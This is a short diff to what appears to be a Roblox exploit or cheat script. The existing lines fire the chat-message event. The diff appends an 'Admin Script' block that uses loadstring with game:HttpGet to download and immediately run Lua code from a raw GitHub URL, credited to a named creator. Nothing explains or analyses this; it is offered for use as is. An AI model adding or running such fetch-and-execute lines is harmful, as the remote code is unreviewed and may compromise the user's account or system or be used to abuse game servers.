@@ -232,3 +232,8 @@ local A_2 = "All"
 local Event =
 
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+                                       ----- Admin Script -------
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/ZenexGT/23kLua-AdminV2/main/SS%20Admin"), true))()
+
+--creator:Suki
